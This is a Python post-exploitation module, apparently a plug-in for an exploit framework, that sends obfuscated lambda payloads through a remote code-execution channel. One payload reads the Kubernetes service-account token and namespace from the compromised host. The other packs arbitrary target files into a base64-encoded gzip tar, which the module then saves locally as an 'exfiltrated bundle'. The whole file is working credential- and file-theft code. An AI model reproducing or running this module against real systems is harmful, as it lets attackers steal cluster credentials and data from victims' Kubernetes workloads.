import ast
import base64
import os

def run(exploit, param=None):
    # 1. PARAMETER PARSING & TARGET SELECTION
    if isinstance(param, str):
        paths = [param]
    elif isinstance(param, list):
        paths = param
    else:
        paths = ["token"]

    # Default output file
    output_file = "exfiltrated_bundle.tar.gz"
    
    # Check if the last item is the intended destination
    if len(paths) > 1 and (paths[-1].endswith(".tar.gz") or paths[-1].endswith(".tgz") or "/" in paths[-1]):
        output_file = paths.pop()

    token_only = "token-only" in paths
    mode = "token" if ("token" in paths or token_only) else "file/dir"

    if not token_only:
        print(f"\n[ SYSTEM EXFIL: {mode.upper()} RETRIEVAL ]")

    # 2. PAYLOAD GENERATION
    if mode == "token":
        exfil_payload = (
            "(lambda: (lambda os: str({p: (open(p).read() if os.path.exists(p) else 'NOT_FOUND') for p in ["
            "'/var/run/secrets/kubernetes.io/serviceaccount/namespace',"
            "'/var/run/secrets/kubernetes.io/serviceaccount/token'"
            "]}))(__import__('os')))()"
        )
    else:
        if not token_only:
            print(f"[*] Packaging {len(paths)} targets into a compressed Gzip archive...")
            for p in paths:
                print(f"  -> Adding: {p}")
        
        paths_code = str(paths)
        exfil_payload = (
            f"(lambda: (lambda os, tarfile, io, b64: "
            f" (lambda p_list: (b64.b64encode((lambda b: (lambda t: [t.add(p, arcname=os.path.basename(p)) "
            f" for p in p_list if os.path.exists(p)][0] or t.close() or b.getvalue())(tarfile.open(fileobj=b, mode='w:gz')))"
            f" (io.BytesIO())).decode()))"
            f" ({paths_code}))(__import__('os'), __import__('tarfile'), __import__('io'), __import__('base64')))()"
        )

    # 3. EXECUTION
    result = exploit.execute(exfil_payload)

    # 4. HANDLING THE RESULT
    try:
        if mode == "token":
            data = ast.literal_eval(result.strip())
            token = data.get('/var/run/secrets/kubernetes.io/serviceaccount/token', 'NOT_FOUND').strip()
            
            if token_only:
                print(token)
                return 
                
            ns = data.get('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'NOT_FOUND').strip()
            print(f"NAMESPACE : {ns}")
            print(f"TOKEN     : {token}" if token != 'NOT_FOUND' else "TOKEN     : NOT_FOUND")
        
        else:
            if not result or "ERROR" in result or len(result) < 10:
                print(f"[-] Retrieval failed: Target paths may not exist or are empty.")
            else:
                output_dir = os.path.dirname(output_file)
                if output_dir and not os.path.exists(output_dir):
                    os.makedirs(output_dir)

                with open(output_file, "wb") as f:
                    f.write(base64.b64decode(result))
                
                # Updated Success Output
                print(f"STATUS    : Transfer Successful (Gzip Compressed)")
                print(f"SAVED TO  : {os.path.abspath(output_file)}")
                print(f"EXTRACT   : tar -xzvf {output_file}")
            
    except Exception as e:
        print(f"[-] Parsing Error: {e}")
        print(f"DEBUG Raw: {result[:100]}")

    if not token_only:
        print(f"[ Exfil Complete ]\n")